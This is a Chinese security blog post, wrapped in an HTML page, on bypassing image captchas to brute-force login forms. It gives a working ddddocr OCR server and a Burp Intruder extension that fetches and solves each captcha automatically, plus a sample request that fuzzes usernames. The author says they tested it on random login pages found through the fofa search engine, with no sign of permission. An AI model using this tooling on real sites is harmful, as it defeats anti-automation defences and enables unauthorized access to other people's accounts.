@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>从OCR库联动burp验证码爆破 | Ja9er&#39;s Studio</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://ja9er.github.io/favicon.ico?v=1642400876014">
+<link rel="stylesheet" href="https://ja9er.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="从OCR库联动burp验证码爆破
+OCR库选择
+这里直接选择DDDDOCR这个库，非常好用
+首先PIP下载
+
+python3 -m pip install ddddocr -i https://pypi.tuna.tsinghua.edu...." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://ja9er.github.io">
+        <img src="https://ja9er.github.io/images/avatar.png?v=1642400876014" class="site-logo">
+        <h1 class="site-title">Ja9er&#39;s Studio</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      燃烧掉总比消失好
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://ja9er.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">从OCR库联动burp验证码爆破</h2>
+            <div class="post-date">2022-01-14</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="从ocr库联动burp验证码爆破">从OCR库联动burp验证码爆破</h1>
+<h2 id="ocr库选择">OCR库选择</h2>
+<p>这里直接选择DDDDOCR这个库，非常好用</p>
+<p>首先PIP下载</p>
+<blockquote>
+<p>python3 -m pip install ddddocr -i https://pypi.tuna.tsinghua.edu.cn/simple</p>
+</blockquote>
+<p>官方用法，这里的img_bytes是十六进制数据</p>
+<pre><code class="language-python">import ddddocr
+ocr = ddddocr.DdddOcr()
+with open('1.png', 'rb') as f:
+    img_bytes = f.read()
+res = ocr.classification(img_bytes)
+print(res)
+</code></pre>
+<p>效果可以看到还是非常不错的</p>
+<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/7U2p4K"><img src="https://s4.ax1x.com/2022/01/17/7U2p4K.png" alt="7U2p4K.png" loading="lazy"></a></figure>
+<h2 id="服务端">服务端</h2>
+<p>因为DDDDOCR这个库是python3的，burp的jython是python2的，显然不能混在一起用。所以暂时设置为C/S架构。把验证码识别服务化。这里直接魔改其他师傅的项目。当然也可以用flask起一个轻量服务器。</p>
+<p>这是python3的服务脚本，默认路径下展示最新识别的20个验证码,路径/base64 作为识别接口，获取传入的img base64后的数据，返回识别字符</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- conding:utf-8 -*-
+import ddddocr
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import re, time, base64, os
+import urllib.parse
+
+host = ('0.0.0.0', 8899)
+count = 20  # 保存多少个验证码及结果
+
+class Resquest(BaseHTTPRequestHandler):
+    def handler(self):
+        print(&quot;data:&quot;, self.rfile.readline().decode())
+        self.wfile.write(self.rfile.readline())
+
+    def do_GET(self):
+        print(self.requestline)
+        if self.path != '/':
+            self.send_error(404, &quot;Page not Found!&quot;)
+            return
+        with open('temp/log.txt', 'r') as f:
+            content = f.read()
+        data = '&lt;title&gt;404 NOT FOUND&lt;/title&gt;&lt;body style=&quot;text-align:center&quot;&gt;&lt;h1&gt;验证码识别&lt;/h1&gt;&lt;p&gt;&lt;TABLE style=&quot;&quot; borderColor=&quot;&quot; height=40 cellPadding=1 align=center border=20&gt;&lt;tr align=center&gt;&lt;td&gt;验证码&lt;/td&gt;&lt;td&gt;识别结果&lt;/td&gt;&lt;td&gt;时间&lt;/td&gt;&lt;/tr&gt;%s&lt;/body&gt;'%(content)
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html; charset=UTF-8')
+        self.end_headers()
+        self.wfile.write(data.encode())
+    def do_POST(self):
+        text = ''
+        try:
+            if self.path != '/base64':
+                self.send_error(404, &quot;Page not Found!&quot;)
+                return
+            req_datas = self.rfile.read(int(self.headers['content-length']))
+            req_datas = req_datas.decode()
+            base64_img = str(req_datas).replace(&quot;base64=&quot;, &quot;&quot;)
+            base64_img = urllib.parse.unquote(base64_img)
+            # print(base64_img.group(1)) #post base64参数的内容
+            img_name=time.time()
+            with open(&quot;temp/%s.png&quot;%img_name, 'wb') as f:
+                f.write(base64.b64decode(base64_img))
+                f.close()
+            ocr = ddddocr.DdddOcr(show_ad=False)
+            img_bytes = base64.b64decode(base64_img)
+            res = ocr.classification(img_bytes)
+            text = res
+            print(text)
+            with open('temp/log.txt', 'r') as f:
+                data = &quot;&quot;
+                counts = 0
+                content = f.read()
+                pattern = re.compile(r'.*?\n')
+                result1 = pattern.findall(content)
+                for i in result1:
+                    counts += 1
+                    if counts &gt;= count:break
+                    data = data + i
+            with open('temp/log.txt', 'w+') as f:
+                f.write('&lt;tr align=center&gt;&lt;td&gt;&lt;img src=&quot;data:image/png;base64,%s&quot;/&gt;&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\n'%(base64_img,text,time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(int(img_name))))+ data)
+            os.remove(&quot;temp/%s.png&quot; % img_name)
+        except Exception as e:
+            text = '0000'
+            print('\n识别失败！\n')
+            print(e)
+        if text == '':
+            text = '0000'
+            print('\n识别失败！\n')
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(text.encode('utf-8'))
+
+
+if __name__ == '__main__':
+    server = HTTPServer(host, Resquest)
+    print(&quot;Starting server, listen at: %s:%s&quot; % host)
+    server.serve_forever()
+
+</code></pre>
+<p>随机在fofa上找了几个带验证码的登录口试了试，乱码是因为保存下来的字符编码从UTF8被换到了GBK</p>
+<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/7UgzAx"><img src="https://s4.ax1x.com/2022/01/17/7UgzAx.png" alt="7UgzAx.png" loading="lazy"></a></figure>
+<h2 id="burp插件">Burp插件</h2>
+<p>burp给了很多api用于写插件，基本每个模块都给了。在extender-APIs中可以查看详情，因为验证码识别一般用于登录口爆破之类的模块，所以选择爆破模块也就是IIntruderPayloadGeneratorFactory。</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# coding:utf-8
+from burp import IBurpExtender
+from burp import IIntruderPayloadGeneratorFactory
+from burp import IIntruderPayloadGenerator
+import base64
+import json
+import re
+import urllib2
+import ssl
+
+host = ('127.0.0.1', 8899)#服务端的IP和PORT
+
+class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):#IBurpExtender是每个插件都要用的，让burp识别你为插件
+    def registerExtenderCallbacks(self, callbacks):
+        #注册payload生成器
+        callbacks.registerIntruderPayloadGeneratorFactory(self)
+        #插件里面显示的名字
+        callbacks.setExtensionName(&quot;OCR_CAPTCHA&quot;)
+        print 'OCR_CAPTCHA\n用法：\n在head头部添加DDDDOCR:验证码的URL\n\n如：\n\nPOST /login HTTP/1.1\nHost: www.baidu.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/plain, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nDDDDOCR:http://www.baidu.com/get-validate-code\nContent-Length: 84\nConnection: close\nCookie: JSESSIONID=24D59677C5EDF0ED7AFAB8566DC366F0\n\nusername=admin&amp;password=admin&amp;vcode=8888\n\n'
+
+    def getGeneratorName(self):
+        return &quot;OCR_CAPTCHA&quot;
+
+    def createNewInstance(self, attack):
+        return OCR_CAPTCHA(attack)
+
+class OCR_CAPTCHA(IIntruderPayloadGenerator):
+    def __init__(self, attack):
+        tem = &quot;&quot;.join(chr(abs(x)) for x in attack.getRequestTemplate()) #request内容
+        cookie = re.findall(&quot;Cookie: (.+?)\r\n&quot;, tem)[0] #获取cookie，用于请求验证码
+        OCR_CAPTCHA = re.findall(&quot;DDDDOCR:(.+?)\r\n&quot;, tem)[0]
+        ssl._create_default_https_context = ssl._create_unverified_context #忽略证书，防止证书报错
+        self.OCR_CAPTCHA = OCR_CAPTCHA
+        self.cookie = cookie
+        self.max = 1 #payload最大使用次数
+        self.num = 0 #标记payload的使用次数
+        self.attack = attack
+
+    def hasMorePayloads(self):
+        #如果payload使用到了最大次数reset就清0
+        if self.num == self.max:
+            return False  # 当达到最大次数的时候就调用reset
+        else:
+            return True
+
+    def getNextPayload(self, payload):
+        OCR_CAPTCHA_url = self.OCR_CAPTCHA #验证码url
+        headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;,&quot;Cookie&quot;:self.cookie}
+        request = urllib2.Request(OCR_CAPTCHA_url,headers=headers)
+        CAPTCHA = urllib2.urlopen(request) #获取图片
+        CAPTCHA_base64 = base64.b64encode(CAPTCHA.read()) #把图片base64编码
+        request = urllib2.Request('http://%s:%s/base64'%host, 'base64='+CAPTCHA_base64)
+        response = urllib2.urlopen(request).read()
+        print(response)
+        return response
+
+    def reset(self):
+        self.num = 0  # 清零
+        return
+</code></pre>
+<p>在extensions中添加以后，随便找一个带验证码的登录入口测试。</p>
+<p>使用intruder的Pitchfork模块，将post包中的验证码打上标记，并且新增一个字段DDDDOCR，值为验证码产生的地址</p>
+<pre><code class="language-http">POST /index.php?c=index&amp;a=login HTTP/1.1
+Host:host
+Content-Length: 51
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://host
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://host/index.php?c=index&amp;a=login
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+DDDDOCR:http://host/index.php?c=verify_code
+Cookie: PHPSESSID=51ilefnld0hlvmq8lm82pa2jvu0macg2
+Connection: close
+
+user=§admin§&amp;password=123456&amp;VerifyCode=§z69s§&amp;login=
+</code></pre>
+<p>payload选择我们的插件</p>
+<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/7UgvH1"><img src="https://s4.ax1x.com/2022/01/17/7UgvH1.png" alt="7UgvH1.png" loading="lazy"></a></figure>
+<p>得到如下结果</p>
+<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/7U2SN6"><img src="https://s4.ax1x.com/2022/01/17/7U2SN6.png" alt="7U2SN6.png" loading="lazy"></a></figure>
+<p>参考</p>
+<blockquote>
+<p>https://github.com/smxiazi/NEW_xp_CAPTCHA</p>
+<p>https://www.t00ls.cc/viewthread.php?tid=63498&amp;highlight=%E9%AA%8C%E8%AF%81%E7%A0%81</p>
+</blockquote>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://ja9er.github.io/tomcat-nei-cun-ma-xue-xi/">
+                  <h3 class="post-title">
+                    Tomcat 内存马学习
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
